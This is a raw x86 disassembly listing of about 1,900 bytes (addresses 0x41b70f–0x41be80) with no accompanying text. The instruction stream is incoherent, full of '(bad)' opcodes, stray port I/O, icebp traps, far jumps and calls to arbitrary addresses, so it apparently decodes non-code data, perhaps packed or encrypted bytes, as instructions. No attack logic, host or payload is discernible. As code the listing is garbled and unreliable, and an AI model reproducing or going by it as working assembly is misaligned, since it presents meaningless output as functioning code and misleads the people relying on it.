  41b70f:	cdq    
  41b710:	cwde   
  41b711:	int3   
  41b712:	sbb    ebp,DWORD PTR [ebx+0x59]
  41b715:	push   es
  41b716:	mov    eax,DWORD PTR [edi-0x39747881]
  41b71c:	mov    ?,WORD PTR [ebx]
  41b71e:	inc    esi
  41b71f:	pop    edx
  41b720:	imul   ebx,DWORD PTR ds:0xac57927f,0x64de6188
  41b72a:	je     0x41b77b
  41b72c:	mov    esi,0xe998ca66
  41b731:	and    ch,BYTE PTR [ebp+0x4f48ffa2]
  41b737:	adc    ecx,ebx
  41b739:	pop    ss
  41b73a:	xchg   DWORD PTR [ebx],edx
  41b73c:	and    dh,BYTE PTR [esi-0x57216e10]
  41b742:	jecxz  0x41b713
  41b744:	inc    edx
  41b745:	lea    ebp,[ebp+ebp*2+0x1d]
  41b749:	sahf   
  41b74a:	mov    esp,0xf0ab1005
  41b74f:	lods   al,BYTE PTR ds:[esi]
  41b750:	or     DWORD PTR [edi-0x60],ebp
  41b753:	rol    edx,1
  41b755:	mov    al,0xd8
  41b757:	mov    esi,0xfd4ddaec
  41b75c:	stc    
  41b75d:	lods   eax,DWORD PTR ds:[esi]
  41b75e:	push   eax
  41b75f:	imul   ecx,edi,0xffffffb3
  41b762:	push   ecx
  41b763:	adc    cl,BYTE PTR [edi+0x11c6c008]
  41b769:	push   ss
  41b76a:	push   ebx
  41b76b:	rcl    DWORD PTR [ebp-0x23782721],0xe2
  41b772:	and    dl,BYTE PTR [ebp-0x851a88e]
  41b778:	(bad)
  41b77b:	pusha  
  41b77c:	icebp  
  41b77d:	push   edx
  41b77e:	add    eax,esp
  41b780:	retf   
  41b781:	sbb    al,0x4f
  41b783:	add    dh,al
  41b785:	push   edx
  41b786:	mov    ?,WORD PTR [ecx+0x2b]
  41b789:	add    ch,BYTE PTR [ecx]
  41b78b:	in     al,dx
  41b78c:	mov    al,ds:0xea08c98a
  41b791:	xchg   esp,eax
  41b792:	fsub   QWORD PTR [eax+0x1f329a9a]
  41b798:	mov    eax,ds:0x14b27194
  41b79d:	mov    edi,0x213b1956
  41b7a2:	popa   
  41b7a3:	rcl    DWORD PTR [edx],0xb2
  41b7a6:	stc    
  41b7a7:	sub    al,0xdf
  41b7a9:	ret    0x8593
  41b7ac:	jl     0x41b7f7
  41b7ae:	xor    DWORD PTR [edi-0x751e984d],edi
  41b7b4:	jg     0x41b7e5
  41b7b6:	ret    0xc1
  41b7b9:	sub    eax,0x86ca19b1
  41b7be:	sub    eax,0x4e034b1
  41b7c3:	jmp    0xbcd9c542
  41b7c8:	xchg   edx,eax
  41b7c9:	data16 sbb cl,BYTE PTR [ecx]
  41b7cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7cd:	inc    eax
  41b7ce:	lea    edi,ds:0x2961
  41b7d3:	push   ss
  41b7d4:	bound  edi,QWORD PTR [esi+eiz*4+0x3d53acd1]
  41b7db:	and    esp,eax
  41b7dd:	xchg   edi,eax
  41b7de:	leave  
  41b7df:	sbb    eax,0x24ef0613
  41b7e4:	sbb    al,0xa3
  41b7e6:	stc    
  41b7e7:	out    dx,eax
  41b7e8:	jmp    0x1761:0xd86f32be
  41b7ef:	add    eax,0xdcbecf09
  41b7f4:	xchg   edi,eax
  41b7f5:	arpl   WORD PTR [esi+0x7a5b40b],dx
  41b7fb:	mov    eax,ds:0x6e91df1e
  41b800:	mov    cl,0xc7
  41b802:	in     al,dx
  41b803:	mov    eax,DWORD PTR [ebp+0x0]
  41b806:	inc    ebx
  41b807:	cmp    eax,0xd7985209
  41b80c:	dec    edi
  41b80d:	inc    eax
  41b80e:	dec    ecx
  41b80f:	out    0xcd,al
  41b811:	and    eax,0x5fd2a207
  41b816:	add    ebp,eax
  41b818:	daa    
  41b819:	in     al,dx
  41b81a:	jmp    0x5b4d:0xc53ff5e6
  41b821:	aad    0x9e
  41b823:	sbb    al,0x7a
  41b825:	cmp    BYTE PTR [ebp+0x57efff3c],dl
  41b82b:	push   0x23
  41b82d:	push   edi
  41b82e:	(bad)  
  41b82f:	cmp    cl,BYTE PTR [edi+0x757bbcc0]
  41b835:	or     ch,BYTE PTR gs:[ebx-0x482faa40]
  41b83c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b83d:	iret   
  41b83e:	adc    al,0xe2
  41b840:	shl    al,0x54
  41b843:	mov    eax,ebp
  41b845:	fild   DWORD PTR [ecx-0x3a]
  41b848:	cmp    BYTE PTR [edi+0x71],0xf5
  41b84c:	cmp    ebp,DWORD PTR [eax+0x605347fb]
  41b852:	and    BYTE PTR ds:0x9b86675b,ch
  41b858:	loop   0x41b7ec
  41b85a:	xchg   ecx,eax
  41b85b:	sbb    ah,cl
  41b85d:	cmp    ebp,ecx
  41b85f:	mov    cl,0xe7
  41b861:	pop    ebp
  41b862:	sbb    DWORD PTR [ebx+esi*8+0x38],0x3a
  41b867:	sahf   
  41b868:	mov    ?,WORD PTR [edi-0x69b7890f]
  41b86e:	ds fdiv st(4),st
  41b871:	xlat   BYTE PTR ds:[ebx]
  41b872:	adc    BYTE PTR [ecx+edx*2+0x1b26f082],ah
  41b879:	mov    bh,0xdf
  41b87b:	mov    eax,ds:0xa78669cb
  41b880:	fiadd  WORD PTR [ecx]
  41b882:	mov    ebp,0xf675b0d
  41b887:	dec    eax
  41b889:	add    DWORD PTR [edi-0x67ce79d6],0xffffff81
  41b890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b891:	cmp    DWORD PTR [ebp+0x6220f595],edi
  41b897:	cmp    ah,ch
  41b899:	push   0xb
  41b89b:	jbe    0x41b90e
  41b89d:	ret    0x6ef7
  41b8a0:	in     al,0x5f
  41b8a2:	retf   0xa5f3
  41b8a5:	xchg   ebp,eax
  41b8a6:	inc    ebp
  41b8a7:	jmp    0x41b89b
  41b8a9:	(bad)  
  41b8aa:	div    DWORD PTR [esi]
  41b8ac:	sbb    al,0x9e
  41b8ae:	(bad)  
  41b8af:	fstp   TBYTE PTR [ecx]
  41b8b1:	shl    DWORD PTR [ecx-0x44],1
  41b8b4:	add    DWORD PTR ds:0xf2623faf,esp
  41b8ba:	lods   eax,DWORD PTR ds:[esi]
  41b8bb:	xor    eax,0xde605b60
  41b8c0:	cli    
  41b8c1:	xor    al,0x30
  41b8c3:	bound  ebp,QWORD PTR [edi]
  41b8c5:	xor    al,0xc0
  41b8c7:	dec    eax
  41b8c8:	mov    al,0x87
  41b8ca:	jns    0x41b88b
  41b8cc:	adc    esp,esp
  41b8ce:	inc    ecx
  41b8cf:	out    0x22,eax
  41b8d1:	sbb    edi,edx
  41b8d3:	ret    0x6bd4
  41b8d6:	addr16 or al,0xe4
  41b8d9:	and    al,0xb3
  41b8db:	retf   0x349c
  41b8de:	inc    edx
  41b8df:	iret   
  41b8e0:	adc    al,0xb1
  41b8e2:	dec    esp
  41b8e3:	push   edx
  41b8e4:	lahf   
  41b8e5:	push   ecx
  41b8e6:	xchg   ebx,eax
  41b8e7:	add    eax,eax
  41b8e9:	sbb    ah,BYTE PTR [ebp-0x71]
  41b8ec:	sub    esp,DWORD PTR [ebx+0x65]
  41b8ef:	adc    ecx,DWORD PTR fs:[ebx]
  41b8f2:	das    
  41b8f3:	ficom  WORD PTR [ebp+0x75]
  41b8f6:	add    DWORD PTR [ebx+0x53],0xaea4f0cb
  41b8fd:	retf   0x45ae
  41b900:	jbe    0x41b906
  41b902:	cmp    dl,BYTE PTR [edi-0x6ac84448]
  41b908:	les    ecx,FWORD PTR [ecx*8-0x77c034b2]
  41b90f:	sub    edi,DWORD PTR [edi-0x7fb63f3a]
  41b915:	test   DWORD PTR [edx+0x2db1cf59],esi
  41b91b:	data16 add BYTE PTR [ebx],ch
  41b91e:	popa   
  41b91f:	jmp    0x41b937
  41b921:	dec    ecx
  41b922:	gs xor al,0x94
  41b925:	int3   
  41b926:	adc    BYTE PTR [edi-0x77],0xaf
  41b92a:	adc    BYTE PTR [edi],ah
  41b92c:	ret    0x6fd2
  41b92f:	gs int3 
  41b931:	push   ebx
  41b932:	icebp  
  41b933:	push   ebx
  41b934:	adc    dh,0xc3
  41b937:	pop    ebp
  41b938:	pop    ecx
  41b939:	stos   DWORD PTR es:[edi],eax
  41b93a:	icebp  
  41b93b:	ja     0x41b8cb
  41b93d:	inc    eax
  41b93e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b93f:	ret    
  41b940:	mov    ds:0xa1d2342e,al
  41b945:	add    bl,BYTE PTR [esi+esi*2+0x56]
  41b949:	arpl   WORD PTR [esi],di
  41b94b:	stos   BYTE PTR es:[edi],al
  41b94c:	(bad)  
  41b94d:	mov    ecx,0x6a2fdd11
  41b952:	idiv   DWORD PTR [edi+0x1b1a52dc]
  41b958:	sbb    esi,ecx
  41b95a:	jle    0x41b9b2
  41b95c:	ja     0x41b913
  41b95e:	nop
  41b95f:	jmp    0x202d:0x9d424b51
  41b966:	mov    ecx,DWORD PTR [ecx+0x4560eee8]
  41b96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b96d:	cld    
  41b96e:	je     0x41b94f
  41b970:	lahf   
  41b971:	xchg   ebp,eax
  41b972:	aaa    
  41b973:	jge    0x41b92e
  41b975:	pop    esi
  41b976:	or     ah,BYTE PTR ds:0x980f6c3e
  41b97c:	and    eax,DWORD PTR [ecx+0x41]
  41b97f:	cdq    
  41b980:	icebp  
  41b981:	bound  edx,QWORD PTR [edi-0x23]
  41b984:	jmp    0xdd2738f4
  41b989:	adc    bl,BYTE PTR [esi]
  41b98b:	pop    esp
  41b98c:	mov    ds:0xc2811814,al
  41b991:	fisubr WORD PTR [ebp+0x68]
  41b994:	pop    eax
  41b995:	(bad)  
  41b997:	xor    BYTE PTR [edi+edx*4-0x58],cl
  41b99b:	outs   dx,DWORD PTR ds:[esi]
  41b99c:	mov    dh,0x38
  41b99e:	mov    bl,0x2
  41b9a0:	cmp    ebx,ebx
  41b9a2:	and    esp,0xffffffd4
  41b9a5:	fucomip st,st(0)
  41b9a7:	and    al,BYTE PTR [ebp-0x3c928590]
  41b9ad:	or     BYTE PTR [ebx+edx*1],ch
  41b9b0:	adc    eax,0x40cb3263
  41b9b5:	cmp    dh,BYTE PTR ss:[ebp-0x6ae20b0b]
  41b9bc:	aad    0xa1
  41b9be:	stos   BYTE PTR es:[edi],al
  41b9bf:	mov    eax,ds:0x972b631b
  41b9c4:	imul   ecx,ebp,0x68
  41b9c7:	cdq    
  41b9c8:	jle    0x41ba37
  41b9ca:	test   cl,0x5e
  41b9cd:	add    al,0xc9
  41b9cf:	mov    ch,0x7e
  41b9d1:	mov    cl,0xd8
  41b9d3:	sqrtps xmm0,XMMWORD PTR [edi-0x30c06f58]
  41b9da:	jns    0x41ba2d
  41b9dc:	sbb    eax,0x41ea13a2
  41b9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9e2:	test   BYTE PTR ds:0xcdb35045,al
  41b9e8:	repz aaa 
  41b9ea:	test   bl,0xc6
  41b9ed:	popf   
  41b9ee:	pop    edi
  41b9ef:	cmp    BYTE PTR ds:0x8cc53588,dh
  41b9f5:	xchg   BYTE PTR [edi+0x373b399b],ch
  41b9fb:	xor    DWORD PTR [ecx],0x3e50fb48
  41ba01:	jo     0x41ba23
  41ba03:	jp     0x41b995
  41ba05:	pop    esi
  41ba06:	pusha  
  41ba07:	add    edx,ebp
  41ba09:	fisttp WORD PTR [ecx]
  41ba0b:	imul   BYTE PTR [ecx-0x696926a6]
  41ba11:	adc    BYTE PTR [esi+0x523e29b5],dh
  41ba17:	iret   
  41ba18:	cld    
  41ba19:	adc    cl,BYTE PTR [eax+0x72e95f4e]
  41ba1f:	sub    ebp,DWORD PTR [esi-0x2a0e3b43]
  41ba25:	jmp    0xed1060b6
  41ba2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba2b:	fiadd  WORD PTR [ecx-0x64a154a5]
  41ba31:	(bad)  
  41ba32:	(bad)  
  41ba33:	or     eax,0x8c648ca9
  41ba38:	cmc    
  41ba39:	test   DWORD PTR [eax-0x677d1d84],eax
  41ba3f:	add    DWORD PTR [ebx+0x1d],0x6f9d8a9e
  41ba46:	and    al,0x67
  41ba48:	push   esi
  41ba49:	adc    DWORD PTR [ecx+0x1f],ebp
  41ba4c:	jl     0x41baca
  41ba4e:	sbb    bh,dh
  41ba50:	les    esi,FWORD PTR [edx-0x50446aa8]
  41ba56:	retf   
  41ba57:	ins    DWORD PTR es:[edi],dx
  41ba58:	(bad)  [edi]
  41ba5a:	in     al,0xa0
  41ba5c:	xor    eax,0x7a7ffabc
  41ba61:	(bad)  
  41ba62:	jecxz  0x41ba4f
  41ba64:	(bad)  
  41ba65:	adc    BYTE PTR [ecx-0x45fa7064],cl
  41ba6b:	add    eax,0x9152875b
  41ba70:	lock test BYTE PTR [ebx+0x60],dh
  41ba74:	pop    ds
  41ba75:	pop    edx
  41ba76:	dec    ebp
  41ba77:	fldenv ds:0x968c868
  41ba7d:	jp     0x41ba22
  41ba7f:	or     ah,dh
  41ba81:	xchg   edx,eax
  41ba82:	in     eax,dx
  41ba83:	retf   
  41ba84:	and    DWORD PTR [eax+0x2c],eax
  41ba87:	pop    esi
  41ba88:	mov    dl,0xf5
  41ba8a:	cmp    al,0x0
  41ba8c:	dec    esi
  41ba8d:	cli    
  41ba8e:	imul   ebx,DWORD PTR [ebx+0x191167d9],0x58
  41ba95:	fmul   st(7),st
  41ba97:	lea    esi,[eax]
  41ba99:	icebp  
  41ba9a:	xchg   DWORD PTR [esi+0x6b1b3162],ecx
  41baa0:	pop    ds
  41baa1:	test   al,0xa3
  41baa3:	sbb    eax,0x705c92ca
  41baa8:	jns    0x41baa1
  41baaa:	cmp    eax,0xc389f63c
  41baaf:	xor    bh,bl
  41bab1:	int    0x7f
  41bab3:	and    eax,0x739eba3e
  41bab8:	and    al,0xf1
  41baba:	outs   dx,BYTE PTR ds:[esi]
  41babb:	es aas 
  41babd:	adc    BYTE PTR ds:0xc89bd617,ch
  41bac3:	cld    
  41bac4:	xchg   edx,eax
  41bac5:	icebp  
  41bac6:	stc    
  41bac7:	add    ch,dh
  41bac9:	mov    ah,0x61
  41bacb:	push   0xffffffb5
  41bacd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bace:	cmc    
  41bacf:	or     DWORD PTR ds:0xa3629573,esp
  41bad5:	push   ecx
  41bad6:	push   esi
  41bad7:	js     0x41ba77
  41bad9:	cmp    al,0x67
  41badb:	mov    bl,0xe6
  41badd:	mov    ch,0x15
  41badf:	out    dx,eax
  41bae0:	scas   al,BYTE PTR es:[edi]
  41bae1:	(bad)  
  41bae3:	mov    edx,0x11a05056
  41bae8:	sbb    eax,0xe4d516cf
  41baed:	mov    ecx,0xd69b5466
  41baf2:	cmp    DWORD PTR [ecx+0x6b],eax
  41baf5:	data16 jns 0x41bb07
  41baf8:	in     al,dx
  41baf9:	ret    
  41bafa:	jp     0x41bb21
  41bafc:	lods   al,BYTE PTR ds:[esi]
  41bafd:	mov    ah,BYTE PTR [ebx+0x52f49c4f]
  41bb03:	pop    es
  41bb04:	shl    BYTE PTR [esi-0x6b9f4dde],1
  41bb0a:	xlat   BYTE PTR ds:[ebx]
  41bb0b:	inc    eax
  41bb0c:	jle    0x41bafc
  41bb0e:	retf   
  41bb0f:	repz fdiv QWORD PTR [ebx-0xd8d9bcd]
  41bb16:	push   esi
  41bb17:	mov    eax,0x24995a0
  41bb1c:	mov    esi,0xe82cdba8
  41bb21:	mov    bl,0x18
  41bb23:	ds dec ebx
  41bb25:	(bad)  
  41bb26:	scas   al,BYTE PTR es:[edi]
  41bb27:	aas    
  41bb28:	inc    ecx
  41bb29:	pop    esi
  41bb2a:	fnstsw WORD PTR [edx-0x46]
  41bb2d:	push   ebx
  41bb2e:	push   ss
  41bb2f:	jge    0x41bb20
  41bb31:	inc    edx
  41bb32:	(bad)  
  41bb33:	ror    cl,cl
  41bb35:	daa    
  41bb36:	xor    eax,0x2a4f8c9b
  41bb3b:	xchg   esp,eax
  41bb3c:	scas   eax,DWORD PTR es:[edi]
  41bb3d:	or     edi,DWORD PTR [esi-0x42]
  41bb40:	cmp    edx,DWORD PTR ds:0xf9e7bc7a
  41bb46:	and    edi,DWORD PTR [ebx]
  41bb48:	and    al,0x8c
  41bb4a:	xlat   BYTE PTR ds:[ebx]
  41bb4b:	mov    al,0xbb
  41bb4d:	loop   0x41bb14
  41bb4f:	push   ds
  41bb50:	cli    
  41bb51:	pop    es
  41bb52:	std    
  41bb53:	sar    al,0xf7
  41bb56:	in     al,0x45
  41bb58:	les    ecx,FWORD PTR [ebx]
  41bb5a:	jmp    0x2f04:0x97146019
  41bb61:	xchg   ebx,eax
  41bb62:	add    DWORD PTR [esi],ebp
  41bb64:	ja     0x41bbc6
  41bb66:	pop    esp
  41bb67:	jmp    0xf367f2a
  41bb6c:	out    0x7e,eax
  41bb6e:	pop    ecx
  41bb6f:	or     ebp,esp
  41bb71:	add    DWORD PTR [edx+0x1f],ebx
  41bb74:	pop    es
  41bb75:	sub    DWORD PTR [esi],esp
  41bb77:	repnz repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb7a:	icebp  
  41bb7b:	lock inc edi
  41bb7d:	or     BYTE PTR ds:0xa6048c14,0x6a
  41bb84:	inc    esp
  41bb85:	or     edx,DWORD PTR [ebp-0x52f0c7f5]
  41bb8b:	pop    eax
  41bb8c:	sbb    dl,BYTE PTR [ebp+0x4f4ea218]
  41bb92:	lods   al,BYTE PTR ds:[esi]
  41bb93:	fstp   TBYTE PTR [ecx+0x7267d2df]
  41bb99:	xor    BYTE PTR [ebx],al
  41bb9b:	pop    edi
  41bb9c:	test   al,0x59
  41bb9e:	sti    
  41bb9f:	mov    cl,0xa2
  41bba1:	xchg   ebx,eax
  41bba2:	mov    esi,0x520bf16
  41bba7:	jmp    0xa68e:0xf5b47672
  41bbae:	cmp    DWORD PTR [edx-0x7036b7a7],0xffffffac
  41bbb5:	push   ss
  41bbb6:	mov    ecx,0xd7f3236a
  41bbbb:	dec    ebx
  41bbbc:	rcr    DWORD PTR [esi+esi*2+0x3850c294],cl
  41bbc3:	mov    DWORD PTR [edx],esi
  41bbc5:	sub    al,0x70
  41bbc7:	sub    al,0xa6
  41bbc9:	adc    al,0x61
  41bbcb:	fstp   TBYTE PTR [ecx]
  41bbcd:	mov    al,ds:0x99ae44f
  41bbd2:	adc    DWORD PTR [edi-0x23],0x2d
  41bbd6:	scas   al,BYTE PTR es:[edi]
  41bbd7:	push   edx
  41bbd8:	repnz pop ss
  41bbda:	and    eax,0x958cd207
  41bbdf:	mov    ds:0x59d12024,al
  41bbe4:	sti    
  41bbe5:	mov    BYTE PTR [esi-0x72],dl
  41bbe8:	popf   
  41bbe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbea:	sub    edi,edx
  41bbec:	gs pushf 
  41bbee:	fisubr DWORD PTR [ecx-0x53]
  41bbf1:	ins    BYTE PTR es:[edi],dx
  41bbf2:	pop    ecx
  41bbf3:	xchg   esp,eax
  41bbf4:	adc    ecx,DWORD PTR [esi+0x50]
  41bbf7:	test   DWORD PTR [eax],ebx
  41bbf9:	(bad)  
  41bbfa:	sbb    DWORD PTR [ebx],esp
  41bbfc:	mov    ds:0x831d8713,al
  41bc01:	mov    ch,0x24
  41bc03:	ret    
  41bc04:	add    al,0xcc
  41bc06:	int    0x5c
  41bc08:	pop    edi
  41bc09:	pop    ss
  41bc0a:	arpl   WORD PTR [ebx],si
  41bc0c:	push   cs
  41bc0d:	push   cs
  41bc0e:	mov    eax,ds:0x967543eb
  41bc13:	cmp    eax,edx
  41bc15:	fmul   QWORD PTR [edi-0x5a]
  41bc18:	push   ss
  41bc19:	pop    edx
  41bc1a:	mov    eax,0x7d4c8314
  41bc1f:	mov    edi,0x2bb41342
  41bc24:	ret    0xd33a
  41bc27:	test   al,0xff
  41bc29:	cmp    ecx,DWORD PTR [edx+0x49c85afa]
  41bc2f:	or     al,0x5f
  41bc31:	fistp  WORD PTR [ecx-0x78489ddf]
  41bc37:	(bad)  
  41bc38:	int3   
  41bc39:	leave  
  41bc3a:	test   BYTE PTR [edi+eiz*2],0x6d
  41bc3e:	cmp    al,0x83
  41bc40:	dec    esi
  41bc41:	fsubr  DWORD PTR [esi]
  41bc43:	pop    esp
  41bc44:	pop    es
  41bc45:	jge    0x41bbdc
  41bc47:	(bad)  
  41bc48:	fiadd  WORD PTR [esi]
  41bc4a:	test   eax,0x17aa1cfc
  41bc4f:	mov    al,ds:0x938d3c83
  41bc54:	inc    ecx
  41bc55:	inc    edx
  41bc56:	int3   
  41bc57:	imul   ebx,DWORD PTR [eax],0xffffff97
  41bc5a:	and    BYTE PTR [esi],ch
  41bc5c:	sbb    BYTE PTR [edi],bh
  41bc5e:	xor    edx,DWORD PTR [ebx+0x72b99924]
  41bc64:	pop    edi
  41bc65:	mov    eax,ds:0xadd8a33f
  41bc6a:	in     al,dx
  41bc6b:	xor    ah,BYTE PTR [ebx]
  41bc6d:	std    
  41bc6e:	imul   edi,DWORD PTR [ebp-0x31d3aaf2],0x5b
  41bc75:	nop
  41bc76:	xchg   ah,dl
  41bc78:	cmp    eax,0xf2e3074f
  41bc7d:	stos   BYTE PTR es:[edi],al
  41bc7e:	jns    0x41bc15
  41bc80:	sti    
  41bc81:	loop   0x41bc3a
  41bc83:	imul   edx,DWORD PTR [esi+0xdd8df8f],0x7d75ff71
  41bc8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc8e:	or     eax,0x1bea3b11
  41bc93:	cmp    eax,0x85cacaf7
  41bc98:	stos   BYTE PTR es:[edi],al
  41bc99:	inc    ebx
  41bc9a:	sbb    BYTE PTR [ecx+0x5d8df4f2],dl
  41bca0:	pop    ds
  41bca1:	cmp    eax,DWORD PTR [edx]
  41bca3:	retf   
  41bca4:	addr16 sub al,0x94
  41bca7:	dec    edi
  41bca8:	inc    edi
  41bca9:	xchg   ecx,eax
  41bcaa:	xor    BYTE PTR [eax],0x8e
  41bcad:	and    BYTE PTR [ecx+0x4c3ae57],bl
  41bcb3:	clc    
  41bcb4:	das    
  41bcb5:	xchg   ebp,eax
  41bcb6:	into   
  41bcb7:	inc    edx
  41bcb8:	lea    ecx,[edx+0x77]
  41bcbb:	pop    ecx
  41bcbc:	xor    BYTE PTR [eax+0x6f6f24a],ah
  41bcc2:	cmp    dh,0xdd
  41bcc5:	or     BYTE PTR [edx+0x61d4f35f],ah
  41bccb:	jno    0x41bc91
  41bccd:	cli    
  41bcce:	or     esi,DWORD PTR [ebx]
  41bcd0:	aaa    
  41bcd1:	in     eax,0xc4
  41bcd3:	call   0xe9771140
  41bcd8:	inc    edx
  41bcd9:	das    
  41bcda:	xchg   esp,eax
  41bcdb:	nop
  41bcdc:	mov    dl,0x3d
  41bcde:	sbb    edi,DWORD PTR [ebp+0x4436bcea]
  41bce4:	mov    dl,0x30
  41bce6:	arpl   WORD PTR [ecx-0x1f8b884a],ax
  41bcec:	or     DWORD PTR [edi-0xa],edx
  41bcef:	lods   eax,DWORD PTR ds:[esi]
  41bcf0:	popa   
  41bcf1:	sbb    BYTE PTR [ebp-0x1363f0a4],cl
  41bcf7:	jle    0x41bcb4
  41bcf9:	cmp    esp,DWORD PTR [edi]
  41bcfb:	xchg   edi,eax
  41bcfc:	fdivrp st(1),st
  41bcfe:	out    0x76,al
  41bd00:	add    BYTE PTR [edi],bh
  41bd02:	pushf  
  41bd03:	call   0xc7dacc3
  41bd08:	jg     0x41bce9
  41bd0a:	test   DWORD PTR [edx-0x3f],esi
  41bd0d:	xor    BYTE PTR [edx],cl
  41bd0f:	fwait
  41bd10:	stos   BYTE PTR es:[edi],al
  41bd11:	(bad)  
  41bd12:	cs aad 0x5
  41bd15:	je     0x41bd5d
  41bd17:	sub    eax,ebx
  41bd19:	pop    es
  41bd1a:	(bad)  
  41bd1b:	pop    edi
  41bd1c:	mov    dh,ah
  41bd1e:	jge    0x41bd23
  41bd20:	jno    0x41bd5e
  41bd22:	mov    cl,BYTE PTR [ebx-0x3f3d01c8]
  41bd28:	pop    ebp
  41bd29:	push   eax
  41bd2a:	xchg   BYTE PTR [ebp+0x7032ed91],ch
  41bd30:	fst    QWORD PTR [esi+0x2f]
  41bd33:	xchg   esp,eax
  41bd34:	push   ebx
  41bd35:	adc    bl,BYTE PTR [edi]
  41bd37:	jp     0x41bdb5
  41bd39:	popf   
  41bd3a:	dec    ebp
  41bd3b:	in     eax,dx
  41bd3c:	into   
  41bd3d:	and    eax,0xc0209cde
  41bd42:	aad    0xe4
  41bd44:	dec    DWORD PTR [ecx]
  41bd46:	cdq    
  41bd47:	int3   
  41bd48:	jae    0x41bce5
  41bd4a:	xor    ch,BYTE PTR [esi-0x33a12764]
  41bd50:	add    eax,0x344ec96d
  41bd55:	stc    
  41bd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd57:	jnp    0x41bd83
  41bd59:	cmp    DWORD PTR [eax],ecx
  41bd5b:	imul   ecx,DWORD PTR [edx-0x15ed7d60],0xffffff8c
  41bd62:	jecxz  0x41bd3d
  41bd64:	add    edi,DWORD PTR [eax]
  41bd66:	jge    0x41bdd3
  41bd68:	mov    cl,0x42
  41bd6a:	adc    edx,DWORD PTR [ecx-0x569e97f0]
  41bd70:	lock ja 0x41bd9c
  41bd73:	jmp    0x5a0c:0xb5142e1b
  41bd7a:	je     0x41bdd5
  41bd7c:	xor    bl,BYTE PTR [edx+ecx*1+0x4]
  41bd80:	test   DWORD PTR [esp+edx*1],0x343484d
  41bd87:	lods   al,BYTE PTR ds:[esi]
  41bd88:	and    DWORD PTR [ebx-0x1040c70],ebx
  41bd8e:	or     eax,0x22fb1fe5
  41bd93:	pop    esp
  41bd94:	mov    ah,0x26
  41bd96:	push   edi
  41bd97:	pop    ds
  41bd98:	sub    dl,al
  41bd9a:	sbb    BYTE PTR [esp+edx*2],cl
  41bd9d:	dec    edi
  41bd9e:	push   ebx
  41bd9f:	push   0x44
  41bda1:	or     DWORD PTR [ebx-0x22],ecx
  41bda4:	push   ds
  41bda5:	int3   
  41bda6:	xchg   esi,eax
  41bda7:	mov    cl,0x5c
  41bda9:	(bad)  
  41bdaa:	mov    esp,0x47a291ae
  41bdaf:	loop   0x41be11
  41bdb1:	and    al,0x8f
  41bdb3:	cmp    ebp,DWORD PTR [ecx]
  41bdb5:	dec    ebp
  41bdb6:	dec    ebx
  41bdb7:	(bad)  
  41bdb8:	adc    bh,ah
  41bdba:	mov    eax,ds:0xd11c1b1d
  41bdbf:	xlat   BYTE PTR ds:[ebx]
  41bdc0:	lahf   
  41bdc1:	push   0x49e0998c
  41bdc6:	jae    0x41be39
  41bdc8:	int    0x60
  41bdca:	adc    DWORD PTR [eax],ebx
  41bdcc:	std    
  41bdcd:	fucom  st(5)
  41bdcf:	xor    esi,ecx
  41bdd1:	or     ch,BYTE PTR [edx]
  41bdd3:	dec    ecx
  41bdd4:	pop    edx
  41bdd5:	es out dx,eax
  41bdd7:	jl     0x41bdc7
  41bdd9:	in     eax,0x38
  41bddb:	xor    eax,0xcd01fa98
  41bde0:	pop    edi
  41bde1:	and    BYTE PTR [ecx+0x51c98a01],bh
  41bde7:	mov    esp,0x9b98bffe
  41bdec:	test   al,0x6c
  41bdee:	jno    0x41bdc7
  41bdf0:	sub    eax,DWORD PTR [ecx+ebx*1]
  41bdf3:	mov    esp,0xeb80f02f
  41bdf8:	and    ebp,DWORD PTR [ebx]
  41bdfa:	loope  0x41bdfa
  41bdfc:	push   cs
  41bdfd:	or     al,0xe0
  41bdff:	ret    0x95e0
  41be02:	in     eax,0x3f
  41be04:	and    eax,0x3a2328bb
  41be09:	dec    edx
  41be0a:	lahf   
  41be0b:	cmc    
  41be0c:	je     0x41be68
  41be0e:	shr    BYTE PTR [ebp+0x679ea736],1
  41be14:	ja     0x41be1d
  41be16:	test   al,0x4d
  41be18:	cmp    edx,DWORD PTR [esi+0x17f802cc]
  41be1e:	lea    ebx,[ebp-0x22]
  41be21:	sub    al,0x73
  41be23:	imul   eax,DWORD PTR [edi+0x3b],0xffffffe3
  41be27:	lods   al,BYTE PTR ds:[esi]
  41be28:	sbb    DWORD PTR [edi+esi*1],esp
  41be2b:	stos   BYTE PTR es:[edi],al
  41be2c:	loope  0x41be80
  41be2e:	inc    dx
  41be30:	retf   
  41be31:	sub    eax,0x1292bb46
  41be36:	adc    eax,0x3c97860b
  41be3b:	inc    esp
  41be3c:	sbb    bh,al
  41be3e:	icebp  
  41be3f:	sahf   
  41be40:	xchg   edx,eax
  41be41:	add    esi,eax
  41be43:	mov    eax,ds:0xf69d7b37
  41be48:	fadd   DWORD PTR [eax-0x4784a206]
  41be4e:	push   0x56
  41be50:	jecxz  0x41be76
  41be52:	in     eax,0xb8
  41be54:	or     ebp,DWORD PTR [esi]
  41be56:	jo     0x41bdfb
  41be58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be59:	cld    
  41be5a:	fdiv   DWORD PTR [esi+0x5c]
  41be5d:	pop    ebp
  41be5e:	cmp    ch,dh
  41be60:	add    BYTE PTR [ecx+0xe],0xd0
  41be64:	sub    eax,0xbb4b4f89
  41be69:	push   0xffffff8f
  41be6b:	sub    ebp,DWORD PTR [ebx]
  41be6d:	lods   eax,DWORD PTR ds:[esi]
  41be6e:	test   eax,0x307d877e
  41be73:	adc    eax,0xe415ad21
  41be78:	push   sp
  41be7a:	jnp    0x41bea0
  41be7c:	sub    al,0x9c
  41be7e:	jp     0x41be54
  41be80:	imul   edx,DWORD PTR ds:0x9058a0e5,0xffffffe7
